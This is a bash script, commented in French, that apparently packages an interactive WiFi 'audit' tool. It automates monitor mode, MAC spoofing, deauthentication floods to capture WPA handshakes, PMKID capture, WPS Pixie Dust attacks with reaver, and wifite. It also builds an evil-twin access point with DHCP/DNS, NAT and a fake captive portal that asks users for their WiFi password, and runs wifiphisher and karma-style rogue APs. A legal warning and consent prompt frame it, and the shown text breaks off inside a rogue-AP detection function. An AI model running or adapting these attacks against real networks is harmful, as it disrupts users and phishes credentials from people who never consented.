#!/usr/bin/env bash
#
# wifi_audit.sh — Script d'audit de sécurité WiFi interactif & automatisé (v2.1)
#
# ⚠️ AVERTISSEMENT LÉGAL ⚠️
# Ce script ne doit être utilisé QUE sur des réseaux WiFi dont vous êtes
# propriétaire, ou pour lesquels vous avez une autorisation écrite explicite.
# L'utilisateur est seul responsable de l'usage qu'il fait de cet outil.
# -----------------------------------------------------------------------

set -uo pipefail

# ==============================
# CONFIGURATION & COULEURS
# ==============================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

LOGDIR="$HOME/wifi_audit_logs/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOGDIR"
SESSION_FILE="$HOME/.wifi_audit_session"

# ==============================
# MISE À JOUR AUTOMATIQUE
# ==============================
CURRENT_VERSION="2.1"
GITHUB_REPO="yomix90/wifi-audit-tool"
BRANCH="main"
SCRIPT_NAME="wifi_audit.sh"
SCRIPT_URL="https://raw.githubusercontent.com/${GITHUB_REPO}/${BRANCH}/${SCRIPT_NAME}"

# Variables globales
IFACE=""
MONIFACE=""
SECOND_IFACE=""
TARGET_BSSID=""
TARGET_ESSID=""
TARGET_CH=""
TARGET_ENC=""
TARGET_PWR=""
LAST_CAPFILE=""
SELECTED_CAP=""
SELECTED_WL=""
SCAN_CSV_PREFIX="$LOGDIR/scan_live"
EVIL_TWIN_PID=""

# Dépendances
REQUIRED_TOOLS=(iw airodump-ng airmon-ng aireplay-ng aircrack-ng macchanger)
OPTIONAL_TOOLS=(wifite reaver pixiewps hcxdumptool hcxpcapngtool xterm hashcat hostapd dnsmasq wifiphisher kismet tshark)

# ==============================
# FONCTIONS D'AFFICHAGE
# ==============================
log()  { echo -e "${BLUE}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1"; }
info() { echo -e "${CYAN}[i]${NC} $1"; }

pause() {
    echo ""
    read -rp "Appuyez sur [Entrée] pour continuer..." _
}

draw_header() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << "EOF"
  __        ___ _____ _        _             _ _ _   
  \ \      / (_)  ___(_)      / \  _   _  __| (_) |_ 
   \ \ /\ / /| | |_  | |     / _ \| | | |/ _` | | __|
    \ V  V / | |  _| | |    / ___ \ |_| | (_| | | |_ 
     \_/\_/  |_|_|   |_|   /_/   \_\__,_|\__,_|_|\__|
EOF
    echo -e "${NC}            ${YELLOW}Audit & Analyse de Sécurité Sans-Fil v${CURRENT_VERSION}${NC}"
    echo -e "${BLUE}========================================================================${NC}"

    if [[ -n "$MONIFACE" ]]; then
        local current_ch
        current_ch=$(iw dev "$MONIFACE" info 2>/dev/null | awk '/channel/{print $2}' | head -1)
        echo -e "  📡 ${BOLD}Interface:${NC} ${GREEN}$IFACE${NC} | ${BOLD}Monitor:${NC} ${GREEN}$MONIFACE (Actif)${NC}"
        [[ -n "$current_ch" ]] && echo -e "  📻 ${BOLD}Canal actuel:${NC} ${YELLOW}$current_ch${NC}"
    elif [[ -n "$IFACE" ]]; then
        echo -e "  📡 ${BOLD}Interface:${NC} ${YELLOW}$IFACE${NC} | ${BOLD}Monitor:${NC} ${RED}Inactif${NC}"
    else
        echo -e "  📡 ${BOLD}Interface:${NC} ${RED}Non sélectionnée${NC}"
    fi

    if [[ -n "$TARGET_BSSID" ]]; then
        local essid_disp="${TARGET_ESSID:-<Masqué>}"
        echo -e "  🎯 ${BOLD}Cible:${NC} ${GREEN}$essid_disp${NC} [BSSID: ${CYAN}$TARGET_BSSID${NC} | CH: ${YELLOW}$TARGET_CH${NC} | Sec: ${MAGENTA}$TARGET_ENC${NC}]"
    else
        echo -e "  🎯 ${BOLD}Cible:${NC} ${YELLOW}Aucune${NC}"
    fi

    [[ -n "$SECOND_IFACE" ]] && echo -e "  📶 ${BOLD}2ème Interface (Evil Twin):${NC} ${GREEN}$SECOND_IFACE${NC}"
    echo -e "  📁 ${BOLD}Logs:${NC} $LOGDIR"
    echo -e "${BLUE}========================================================================${NC}"
}

# ==============================
# MISE À JOUR DEPUIS GITHUB
# ==============================
check_update() {
    draw_header
    log "Vérification des mises à jour..."
    info "Source : $SCRIPT_URL"

    local remote_content
    remote_content=$(curl -fsSL --connect-timeout 10 "$SCRIPT_URL" 2>&1)
    local curl_exit=$?

    if [[ $curl_exit -ne 0 ]]; then
        warn "Échec curl (code $curl_exit). Vérifiez l'URL, la branche et la connexion."
        info "URL testée : $SCRIPT_URL"
        pause
        return 1
    fi

    local remote_version
    remote_version=$(echo "$remote_content" | grep -m1 '^CURRENT_VERSION=' | sed 's/CURRENT_VERSION=//;s/"//g;s/'\''//g')

    if [[ -z "$remote_version" ]]; then
        warn "Variable CURRENT_VERSION introuvable dans le fichier distant."
        pause
        return 1
    fi

    log "Version locale : ${GREEN}${CURRENT_VERSION}${NC} | Distante : ${CYAN}${remote_version}${NC}"

    if [[ "$(printf '%s\n' "$remote_version" "$CURRENT_VERSION" | sort -V | head -n1)" != "$remote_version" ]]; then
        ok "🆕 Nouvelle version disponible : ${GREEN}${remote_version}${NC}"
        read -rp "Mettre à jour automatiquement ? (o/n) : " upd_choice
        if [[ "$upd_choice" =~ ^[oOyY]$ ]]; then
            local script_path
            script_path=$(readlink -f "$0")
            local backup="${script_path}.bak.$(date +%s)"

            log "Sauvegarde : $backup"
            cp "$script_path" "$backup"

            log "Téléchargement v${remote_version}..."
            if curl -fsSL --connect-timeout 10 -o "$script_path" "$SCRIPT_URL"; then
                chmod +x "$script_path"
                ok "✅ Mise à jour réussie vers v${remote_version} !"
                info "Relancez le script pour appliquer les changements."
                exit 0
            else
                err "Échec du téléchargement. Restauration..."
                mv "$backup" "$script_path"
            fi
        fi
    else
        ok "Dernière version installée (v${CURRENT_VERSION})."
    fi
    pause
}

# ==============================
# VÉRIFICATIONS SYSTÈME
# ==============================
check_root() {
    if [[ $EUID -ne 0 ]]; then
        err "Ce script doit être exécuté avec les privilèges root (sudo)."
        exit 1
    fi
}

check_consent() {
    draw_header
    warn "AVERTISSEMENT LÉGAL :"
    echo "Ce programme est destiné UNIQUEMENT à l'audit de réseaux pour lesquels"
    echo "vous disposez d'une autorisation EXPLICITE et ÉCRITE."
    echo "L'utilisation sur des réseaux tiers est ILLÉGALE et passible de poursuites."
    echo ""
    read -rp "Confirmez-vous détenir l'autorisation légale ? (oui/non) : " CONSENT
    if [[ "$CONSENT" != "oui" && "$CONSENT" != "o" ]]; then
        err "Consentement non confirmé. Arrêt du programme."
        exit 1
    fi
}

check_deps() {
    draw_header
    echo -e "${BOLD}--- VÉRIFICATION DES OUTILS ---${NC}\n"

    local missing_req=()
    local missing_opt=()

    log "Outils indispensables :"
    for tool in "${REQUIRED_TOOLS[@]}"; do
        if command -v "$tool" &>/dev/null; then
            ok "  ✓ $tool"
        else
            err "  ✗ $tool (Requis)"
            missing_req+=("$tool")
        fi
    done

    echo ""
    log "Outils optionnels :"
    for tool in "${OPTIONAL_TOOLS[@]}"; do
        if command -v "$tool" &>/dev/null; then
            ok "  ✓ $tool"
        else
            warn "  ⚠ $tool (Optionnel)"
            missing_opt+=("$tool")
        fi
    done

    if [[ ${#missing_req[@]} -gt 0 || ${#missing_opt[@]} -gt 0 ]]; then
        echo ""
        read -rp "Installer les outils manquants via apt ? (o/n) : " INSTALL_CHOICE
        if [[ "$INSTALL_CHOICE" =~ ^[oOyY]$ ]]; then
            log "Installation en cours..."
            apt update
            apt install -y aircrack-ng wifite reaver pixiewps hcxdumptool hcxtools \
                macchanger xterm hashcat hostapd dnsmasq wireless-tools iw \
                iptables python3 python3-pip tshark kismet 2>/dev/null || true
            pip3 install wifiphisher 2>/dev/null || true
            ok "Installation terminée."
        fi
    fi
    pause
}

# ==============================
# GESTION DE SESSION
# ==============================
save_session() {
    {
        echo "IFACE=$IFACE"
        echo "MONIFACE=$MONIFACE"
        echo "SECOND_IFACE=$SECOND_IFACE"
        echo "TARGET_BSSID=$TARGET_BSSID"
        echo "TARGET_ESSID=$TARGET_ESSID"
        echo "TARGET_CH=$TARGET_CH"
        echo "TARGET_ENC=$TARGET_ENC"
        echo "TARGET_PWR=$TARGET_PWR"
        echo "LAST_CAPFILE=$LAST_CAPFILE"
        echo "LOGDIR=$LOGDIR"
    } > "$SESSION_FILE"
}

load_session() {
    if [[ -f "$SESSION_FILE" ]]; then
        read -rp "Session précédente détectée. Restaurer ? (o/n) : " restore
        if [[ "$restore" =~ ^[oOyY]$ ]]; then
            source "$SESSION_FILE"
            ok "Session restaurée."
            pause
        fi
    fi
}

# ==============================
# GESTION DES INTERFACES
# ==============================
get_wireless_interfaces() {
    iw dev 2>/dev/null | awk '$1=="Interface"{print $2}'
}

select_interface() {
    draw_header
    echo -e "${BOLD}--- SÉLECTION DE L'INTERFACE ---${NC}\n"

    local ifaces=()
    while IFS= read -r iface_name; do
        [[ -n "$iface_name" ]] && ifaces+=("$iface_name")
    done < <(get_wireless_interfaces)

    if [[ ${#ifaces[@]} -eq 0 ]]; then
        err "Aucune interface WiFi détectée !"
        pause
        return
    fi

    echo "Interfaces disponibles :"
    for i in "${!ifaces[@]}"; do
        local ifc="${ifaces[$i]}"
        local mac
        mac=$(cat "/sys/class/net/$ifc/address" 2>/dev/null || echo "inconnue")
        local driver
        driver=$(ethtool -i "$ifc" 2>/dev/null | awk -F': ' '$1=="driver"{print $2}' || echo "N/A")
        echo -e "  [${GREEN}$((i + 1))${NC}] ${BOLD}$ifc${NC} (MAC: $mac | Driver: $driver)"
    done
    echo -e "  [${YELLOW}0${NC}] Retour"
    echo ""

    read -rp "Sélection [1-${#ifaces[@]}] : " choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#ifaces[@]} )); then
        IFACE="${ifaces[$((choice - 1))]}"
        if iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor"; then
            MONIFACE="$IFACE"
            ok "Interface : $IFACE (déjà en monitor)"
        else
            MONIFACE=""
            ok "Interface sélectionnée : $IFACE"
        fi
    fi
    save_session
    pause
}

select_second_interface() {
    draw_header
    echo -e "${BOLD}--- SÉLECTION 2ÈME INTERFACE (pour Evil Twin) ---${NC}\n"

    local ifaces=()
    while IFS= read -r iface_name; do
        [[ "$iface_name" != "$IFACE" && -n "$iface_name" ]] && ifaces+=("$iface_name")
    done < <(get_wireless_interfaces)

    if [[ ${#ifaces[@]} -eq 0 ]]; then
        err "Aucune 2ème interface disponible."
        warn "Branchez un 2ème adaptateur WiFi pour Evil Twin."
        pause
        return
    fi

    for i in "${!ifaces[@]}"; do
        echo -e "  [${GREEN}$((i + 1))${NC}] ${BOLD}${ifaces[$i]}${NC}"
    done
    echo -e "  [${YELLOW}0${NC}] Retour"

    read -rp "Choix : " c
    if [[ "$c" =~ ^[0-9]+$ ]] && (( c >= 1 && c <= ${#ifaces[@]} )); then
        SECOND_IFACE="${ifaces[$((c - 1))]}"
        ok "2ème interface : $SECOND_IFACE"
    fi
    save_session
    pause
}

enable_monitor() {
    draw_header
    echo -e "${BOLD}--- ACTIVATION MODE MONITOR ---${NC}\n"

    if [[ -z "$IFACE" ]]; then
        select_interface
        [[ -z "$IFACE" ]] && return
    fi

    log "Nettoyage (airmon-ng check kill)..."
    airmon-ng check kill > "$LOGDIR/airmon_kill.log" 2>&1 || true

    log "Activation sur $IFACE..."
    airmon-ng start "$IFACE" > "$LOGDIR/airmon_start.log" 2>&1

    local detected_mon
    detected_mon=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | grep -E "${IFACE}mon|mon[0-9]|${IFACE}" | head -n1)

    if [[ -n "$detected_mon" ]] && iw dev "$detected_mon" info 2>/dev/null | grep -q "type monitor"; then
        MONIFACE="$detected_mon"
        ok "Mode monitor actif sur : ${GREEN}$MONIFACE${NC}"
    else
        ip link set "$IFACE" down 2>/dev/null || true
        iw "$IFACE" set type monitor 2>/dev/null || true
        ip link set "$IFACE" up 2>/dev/null || true
        if iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor"; then
            MONIFACE="$IFACE"
            ok "Mode monitor via iw sur : ${GREEN}$MONIFACE${NC}"
        else
            err "Échec activation monitor."
        fi
    fi
    save_session
    pause
}

disable_monitor() {
    draw_header
    log "Arrêt mode monitor..."
    local target="${MONIFACE:-$IFACE}"
    if [[ -n "$target" ]]; then
        airmon-ng stop "$target" > "$LOGDIR/airmon_stop.log" 2>&1 || true
        ip link set "$IFACE" down 2>/dev/null || true
        iw "$IFACE" set type managed 2>/dev/null || true
        ip link set "$IFACE" up 2>/dev/null || true
    fi
    MONIFACE=""
    log "Redémarrage NetworkManager / wpa_supplicant..."
    systemctl restart NetworkManager 2>/dev/null || service NetworkManager restart 2>/dev/null || true
    systemctl restart wpa_supplicant 2>/dev/null || true
    ok "Système restauré."
    save_session
    pause
}

change_mac() {
    draw_header
    echo -e "${BOLD}--- GESTION MAC ---${NC}\n"
    [[ -z "$IFACE" ]] && { warn "Sélectionnez d'abord une interface."; pause; return; }

    echo "1) MAC aléatoire"
    echo "2) MAC personnalisée"
    echo "3) Restaurer MAC d'origine"
    echo "0) Annuler"
    read -rp "Choix : " opt

    case "$opt" in
        1) ip link set "$IFACE" down; macchanger -r "$IFACE" | tee "$LOGDIR/mac.log"; ip link set "$IFACE" up ;;
        2) read -rp "MAC (00:11:22:33:44:55) : " cm
           if [[ "$cm" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
               ip link set "$IFACE" down; macchanger -m "$cm" "$IFACE" | tee "$LOGDIR/mac.log"; ip link set "$IFACE" up
           else err "Format invalide."; fi ;;
        3) ip link set "$IFACE" down; macchanger -p "$IFACE" | tee "$LOGDIR/mac.log"; ip link set "$IFACE" up ;;
    esac
    pause
}

test_injection() {
    ensure_monitor_active || return
    draw_header
    log "Test d'injection sur $MONIFACE (~10s)..."
    info "Vérification compatibilité carte/driver..."

    local result
    if result=$(aireplay-ng --test "$MONIFACE" 2>&1); then
        echo "$result" | tee "$LOGDIR/injection_test.log"
        if echo "$result" | grep -q "Injection is working"; then
            ok "✓ Injection fonctionnelle !"
        else
            warn "Résultat partiel - vérifier le log."
        fi
    else
        err "✗ ÉCHEC : Votre carte ne supporte pas l'injection."
        warn "Les déauths échoueront. Essayez un autre driver/carte."
    fi
    pause
}

# ==============================
# SCAN & SÉLECTION
# ==============================
ensure_monitor_active() {
    if [[ -z "$MONIFACE" ]]; then
        warn "Mode monitor non activé."
        read -rp "Activer maintenant ? (o/n) : " opt
        if [[ "$opt" =~ ^[oOyY]$ ]]; then
            enable_monitor
        else
            return 1
        fi
    fi
    return 0
}

scan_and_select_target() {
    ensure_monitor_active || return
    draw_header
    echo -e "${BOLD}--- SCAN WIFI ---${NC}\n"
    echo "  [1] Scan rapide (15s)"
    echo "  [2] Scan complet (30s)"
    echo "  [3] Scan interactif (Ctrl+C pour arrêter)"
    echo "  [0] Annuler"
    read -rp "Choix : " scan_mode

    local scan_duration=0
    case "$scan_mode" in
        1) scan_duration=15 ;;
        2) scan_duration=30 ;;
        3) scan_duration=0 ;;
        0) return ;;
        *) err "Invalide"; pause; return ;;
    esac

    rm -f "${SCAN_CSV_PREFIX}"*

    log "Scan en cours..."
    if [[ $scan_duration -gt 0 ]]; then
        timeout --foreground "$scan_duration" airodump-ng "$MONIFACE" \
            --write "$SCAN_CSV_PREFIX" --output-format csv >/dev/null 2>&1 || true
    else
        info "Ctrl+C pour arrêter."
        sleep 2
        airodump-ng "$MONIFACE" --write "$SCAN_CSV_PREFIX" --output-format csv || true
    fi

    local csv_file="${SCAN_CSV_PREFIX}-01.csv"
    if [[ ! -f "$csv_file" ]]; then
        err "Aucun résultat."; pause; return
    fi

    local bssids=() channels=() privacies=() powers=() essids=()
    local in_ap=true

    while IFS= read -r line; do
        [[ -z "$line" || "$line" == "BSSID"* ]] && continue
        if [[ "$line" == "Station MAC"* ]]; then
            in_ap=false; break
        fi
        if [[ "$in_ap" == true ]]; then
            local bssid ch priv pwr essid
            bssid=$(echo "$line" | awk -F', ' '{print $1}' | tr -d ' ')
            ch=$(echo "$line" | awk -F', ' '{print $4}' | tr -d ' ')
            priv=$(echo "$line" | awk -F', ' '{print $6}' | tr -d ' ')
            pwr=$(echo "$line" | awk -F', ' '{print $9}' | tr -d ' ')
            essid=$(echo "$line" | cut -d',' -f14- | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' -e 's/"//g')

            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                bssids+=("$bssid")
                channels+=("$ch")
                privacies+=("$priv")
                powers+=("$pwr")
                essids+=("${essid:-<Masqué>}")
            fi
        fi
    done < "$csv_file"

    local total=${#bssids[@]}
    if [[ $total -eq 0 ]]; then
        warn "Aucun AP détecté."; pause; return
    fi

    draw_header
    printf "${BOLD}%-4s %-19s %-4s %-6s %-12s %-25s${NC}\n" "N°" "BSSID" "CH" "PWR" "SEC" "ESSID"
    echo "-----------------------------------------------------------------------"
    for i in "${!bssids[@]}"; do
        local num=$((i + 1))
        local p="${powers[$i]}"
        local pc="$GREEN"
        [[ "$p" -lt -75 ]] && pc="$RED"
        [[ "$p" -lt -60 && "$p" -ge -75 ]] && pc="$YELLOW"
        printf "[%2d] %-19s %-4s ${pc}%-6s${NC} %-12s ${BOLD}%-25s${NC}\n" \
            "$num" "${bssids[$i]}" "${channels[$i]}" "$p" "${privacies[$i]}" "${essids[$i]}"
    done
    echo "-----------------------------------------------------------------------"
    read -rp "Sélection [1-$total] : " ap_choice

    if [[ "$ap_choice" =~ ^[0-9]+$ ]] && (( ap_choice >= 1 && ap_choice <= total )); then
        local idx=$((ap_choice - 1))
        TARGET_BSSID="${bssids[$idx]}"
        TARGET_CH="${channels[$idx]}"
        TARGET_ENC="${privacies[$idx]}"
        TARGET_PWR="${powers[$idx]}"
        TARGET_ESSID="${essids[$idx]}"
        ok "Cible : $TARGET_ESSID ($TARGET_BSSID)"
        save_session
    fi
    pause
}

get_target_clients() {
    local csv="${SCAN_CSV_PREFIX}-01.csv"
    [[ ! -f "$csv" ]] && return
    local in_clients=false
    while IFS=, read -r c_mac ftime ltime pwr packets bssid_assoc probed || [[ -n "$c_mac" ]]; do
        c_mac=$(echo "$c_mac" | tr -d ' \r\n"')
        bssid_assoc=$(echo "$bssid_assoc" | tr -d ' \r\n"')
        if [[ "$c_mac" == "StationMAC" ]]; then in_clients=true; continue; fi
        if [[ "$in_clients" == true && "$bssid_assoc" == "$TARGET_BSSID" ]]; then
            echo "$c_mac (Pwr: ${pwr}, Pkts: $packets)"
        fi
    done < "$csv"
}

# ==============================
# ATTAQUES CLASSIQUES
# ==============================
ensure_target_selected() {
    if [[ -z "$TARGET_BSSID" ]]; then
        warn "Aucune cible sélectionnée."
        read -rp "Scanner maintenant ? (o/n) : " opt
        [[ "$opt" =~ ^[oOyY]$ ]] && scan_and_select_target
        [[ -z "$TARGET_BSSID" ]] && return 1
    fi
    return 0
}

capture_handshake() {
    ensure_monitor_active || return
    ensure_target_selected || return

    draw_header
    echo -e "${BOLD}--- CAPTURE HANDSHAKE WPA/WPA2 ---${NC}\n"
    echo -e "Cible : ${GREEN}$TARGET_ESSID${NC} (${CYAN}$TARGET_BSSID${NC}) CH: ${YELLOW}$TARGET_CH${NC}"

    local client_list=()
    while IFS= read -r line; do
        [[ -n "$line" ]] && client_list+=("$line")
    done < <(get_target_clients)

    local target_client=""
    if [[ ${#client_list[@]} -gt 0 ]]; then
        echo "Clients détectés :"
        echo "  [0] Broadcast (tous)"
        for idx in "${!client_list[@]}"; do
            echo "  [$((idx + 1))] ${client_list[$idx]}"
        done
        read -rp "Choix [0-${#client_list[@]}] : " cc
        cc="${cc:-0}"
        if [[ "$cc" =~ ^[0-9]+$ ]] && (( cc >= 1 && cc <= ${#client_list[@]} )); then
            target_client=$(echo "${client_list[$((cc - 1))]}" | awk '{print $1}')
        fi
    fi

    local out="$LOGDIR/handshake_$(echo "$TARGET_BSSID" | tr -d ':')"
    rm -f "${out}"*

    log "Verrouillage canal $TARGET_CH..."
    iw dev "$MONIFACE" set channel "$TARGET_CH" 2>/dev/null || true

    log "Capture airodump-ng..."
    airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$out" --output-format pcap,csv "$MONIFACE" >/dev/null 2>&1 &
    local pid=$!
    sleep 2

    log "Déauthentification..."
    if [[ -n "$target_client" ]]; then
        aireplay-ng --deauth 7 -a "$TARGET_BSSID" -c "$target_client" "$MONIFACE" 2>/dev/null || true
    else
        aireplay-ng --deauth 7 -a "$TARGET_BSSID" "$MONIFACE" 2>/dev/null || true
    fi

    log "Attente handshake..."
    local cap="${out}-01.cap"
    local found=false
    for _ in {1..20}; do
        sleep 1
        echo -n "."
        if [[ -f "$cap" ]] && aircrack-ng "$cap" 2>&1 | grep -q "1 handshake"; then
            found=true; break
        fi
    done
    echo ""
    kill "$pid" 2>/dev/null || true

    if [[ "$found" == true ]]; then
        ok "🏆 HANDSHAKE CAPTURÉ : $cap"
        LAST_CAPFILE="$cap"
        save_session
    else
        warn "Handshake non détecté automatiquement."
        [[ -f "$cap" ]] && aircrack-ng "$cap" | tee "$LOGDIR/check_hs.log"
        LAST_CAPFILE="$cap"
    fi
    pause
}

capture_pmkid() {
    ensure_monitor_active || return
    draw_header
    echo -e "${BOLD}--- CAPTURE PMKID ---${NC}\n"

    if ! command -v hcxdumptool &>/dev/null; then
        err "hcxdumptool non installé."; pause; return
    fi

    read -rp "Durée (s) [défaut: 45] : " dur
    dur="${dur:-45}"

    local pcap="$LOGDIR/pmkid_$(date +%s).pcapng"
    local hash="$LOGDIR/pmkid_hashes.22000"

    log "hcxdumptool pendant ${dur}s..."
    timeout "$dur" hcxdumptool -i "$MONIFACE" -o "$pcap" --enable_status=1 || true

    if [[ -f "$pcap" ]]; then
        ok "Capture : $pcap"
        if command -v hcxpcapngtool &>/dev/null; then
            hcxpcapngtool -o "$hash" "$pcap" || true
        fi
        if [[ -s "$hash" ]]; then
            ok "🎉 PMKID extrait : $hash"
        else
            warn "Aucun PMKID trouvé."
        fi
    fi
    pause
}

wps_attack() {
    ensure_monitor_active || return
    ensure_target_selected || return
    draw_header
    echo -e "${BOLD}--- WPS PIXIE DUST ---${NC}\n"

    if ! command -v reaver &>/dev/null; then
        err "reaver non installé."; pause; return
    fi

    log "Reaver Pixie Dust (-K 1)..."
    reaver -i "$MONIFACE" -b "$TARGET_BSSID" -c "$TARGET_CH" -K 1 -vv \
        2>&1 | tee "$LOGDIR/reaver_$(echo "$TARGET_BSSID" | tr -d ':').log"
    pause
}

run_wifite() {
    ensure_monitor_active || return
    draw_header
    if ! command -v wifite &>/dev/null; then
        err "wifite non installé."; pause; return
    fi
    log "Wifite sur $MONIFACE..."
    wifite -i "$MONIFACE" 2>&1 | tee "$LOGDIR/wifite.log"
    pause
}

# ==============================
# ATTAQUES AVANCÉES
# ==============================
evil_twin_classic() {
    draw_header
    echo -e "${BOLD}--- EVIL TWIN CLASSIQUE (Airbase-ng) ---${NC}\n"
    warn "⚠️ ATTAQUE INTRUSIVE - Nécessite autorisation explicite ⚠️"
    read -rp "Continuer ? (o/n) : " c
    [[ ! "$c" =~ ^[oOyY]$ ]] && return

    ensure_monitor_active || return
    ensure_target_selected || return

    if [[ -z "$SECOND_IFACE" ]]; then
        warn "2ème interface recommandée pour Evil Twin."
        read -rp "Sélectionner maintenant ? (o/n) : " r
        [[ "$r" =~ ^[oOyY]$ ]] && select_second_interface
        if [[ -z "$SECOND_IFACE" ]]; then
            warn "Utilisation de $MONIFACE (limité)."
            SECOND_IFACE="$MONIFACE"
        fi
    fi

    local fake_ssid="${TARGET_ESSID:-EvilTwin}"
    [[ "$fake_ssid" == "<Masqué>" ]] && read -rp "ESSID à cloner : " fake_ssid

    local channel_evil=1
    [[ "$TARGET_CH" -lt 6 ]] && channel_evil=11 || channel_evil=1

    log "Création faux AP : $fake_ssid sur canal $channel_evil..."

    systemctl stop NetworkManager 2>/dev/null || true

    airbase-ng -c "$channel_evil" -e "$fake_ssid" -P -C 20 "$SECOND_IFACE" > "$LOGDIR/airbase.log" 2>&1 &
    EVIL_TWIN_PID=$!
    sleep 3

    ip addr add 192.168.2.1/24 dev at0 2>/dev/null || true
    ip link set at0 up 2>/dev/null || true

    cat > /tmp/evil_dnsmasq.conf << EOF
interface=at0
dhcp-range=192.168.2.10,192.168.2.100,255.255.255.0,12h
dhcp-option=3,192.168.2.1
dhcp-option=6,192.168.2.1
server=8.8.8.8
log-queries
log-facility=$LOGDIR/dnsmasq.log
EOF

    dnsmasq -C /tmp/evil_dnsmasq.conf -p0 > /dev/null 2>&1 &
    local dhcp_pid=$!

    mkdir -p /tmp/evil_portal
    cat > /tmp/evil_portal/index.html << 'EOF'
<!DOCTYPE html><html><head><title>Portail WiFi</title></head>
<body style="font-family:Arial;text-align:center;padding:50px">
<h2>Mise à jour de sécurité requise</h2>
<p>Veuillez confirmer vos identifiants WiFi pour continuer</p>
<form method="POST" action="/login">
<input type="password" name="pwd" placeholder="Mot de passe WiFi">
<button type="submit">Valider</button>
</form></body></html>
EOF

    cd /tmp/evil_portal
    python3 -m http.server 80 > "$LOGDIR/portal.log" 2>&1 &
    local http_pid=$!
    cd - > /dev/null

    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true

    ok "🎭 Evil Twin ACTIF !"
    info "SSID: $fake_ssid | IP: 192.168.2.1 | Portail: http://192.168.2.1"
    warn "Lancez une déauth sur le vrai AP pour forcer les reconnections."
    info "Appuyez sur [Entrée] pour arrêter l'Evil Twin..."
    read -r

    kill "$EVIL_TWIN_PID" "$dhcp_pid" "$http_pid" 2>/dev/null || true
    wait "$EVIL_TWIN_PID" 2>/dev/null || true
    rm -f /tmp/evil_dnsmasq.conf
    rm -rf /tmp/evil_portal
    iptables -t nat -F 2>/dev/null || true
    echo 0 > /proc/sys/net/ipv4/ip_forward
    EVIL_TWIN_PID=""
    systemctl start NetworkManager 2>/dev/null || true
    ok "Evil Twin arrêté."
    info "Logs dans : $LOGDIR"
    pause
}

evil_twin_wifiphisher() {
    draw_header
    echo -e "${BOLD}--- EVIL TWIN WIFIPISHER ---${NC}\n"
    warn "⚠️ Phishing automatisé avancé - Autorisation requise ⚠️"

    if ! command -v wifiphisher &>/dev/null; then
        err "wifiphisher non installé."
        read -rp "Installer via pip ? (o/n) : " i
        [[ "$i" =~ ^[oOyY]$ ]] && pip3 install wifiphisher 2>/dev/null
        command -v wifiphisher &>/dev/null || { err "Installation échouée."; pause; return; }
    fi

    ensure_monitor_active || return
    ensure_target_selected || return

    if [[ -z "$SECOND_IFACE" ]]; then
        warn "Wifiphisher nécessite idéalement 2 interfaces."
        select_second_interface
    fi

    local cmd="wifiphisher"
    if [[ -n "$SECOND_IFACE" && "$SECOND_IFACE" != "$MONIFACE" ]]; then
        cmd="$cmd -aI $SECOND_IFACE -jI $MONIFACE"
    else
        cmd="$cmd -jI $MONIFACE"
    fi
    cmd="$cmd -eSSID $TARGET_ESSID -eBSSID $TARGET_BSSID -c $TARGET_CH"

    log "Lancement wifiphisher..."
    info "Interface web : http://localhost:64857"
    info "Ctrl+C pour arrêter"
    $cmd 2>&1 | tee "$LOGDIR/wifiphisher.log"
    pause
}

karma_attack() {
    draw_header
    echo -e "${BOLD}--- KARMA ATTACK (MANA / Probe Responses) ---${NC}\n"
    warn "⚠️ Cette attaque répond aux Probe Requests des clients"
    warn "pour se faire passer pour tous les réseaux connus."

    if ! command -v hostapd &>/dev/null; then
        err "hostapd non installé."; pause; return
    fi

    ensure_monitor_active || return

    local iface="${SECOND_IFACE:-$MONIFACE}"
    cat > /tmp/karma_hostapd.conf << EOF
interface=$iface
driver=nl80211
ssid=FreeWiFi_Public
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

    log "Lancement hostapd karma..."
    info "AP 'FreeWiFi_Public' actif sur canal 6"
    info "Ctrl+C pour arrêter"
    hostapd /tmp/karma_hostapd.conf 2>&1 | tee "$LOGDIR/karma.log"
    rm -f /tmp/karma_hostapd.conf
    pause
}

detect_rogue_ap() {
    ensure_monitor_active || return
    draw_header
    echo -e "${BOLD}--- DÉTECTION ROGUE AP ---${NC}\n"
    log "Scan passif des AP suspects (15s)..."
    info "Recherche de BSSID clonés, canaux incohérents, SSID suspects..."

    local csv="$LOGDIR/rogue_scan"
    rm -f "${csv}"*
    timeout --foreground 15 airodump-ng "$MONIFACE" --write "$csv" --output-format csv >/dev/null 2>&1 || true

    local file="${csv}-01.csv"
    [[ ! -f "$file" ]] && { err "Scan échoué."; pause; return; }

    echo ""
    echo "🔍 Analyse des anomalies :"

    local ssids
    ssids=$(awk -F', ' '$6 !~ /OPN/ && $14 != "" {print $14}' "$file" | sort | uniq -c | awk '$1 > 1 {print $2}')

    if [[ -n "$ssids" ]]; then
        warn "⚠️ SSID dupliqués détectés (potentiels clones) :"
        echo "$ssids"
    fi

    local open_aps
    open_aps=$(awk -F', ' '$6 == "OPN" && $14 != "" {print $1 " -> " $14}' "$file")
    if [[ -n "$open_aps" ]]; then
        warn "⚠️ AP ouverts détectés :"
        echo "$open_aps"
    fi

    local strong
    strong=$(awk -F', ' '$9 < -30 && $14 != "" {print $1 " ["$14"] Pwr:"$9"dB"}' "$file")
    if [[ -n "$strong" ]]; then
        info "AP à très fort signal (proches) :"
        echo "$strong"
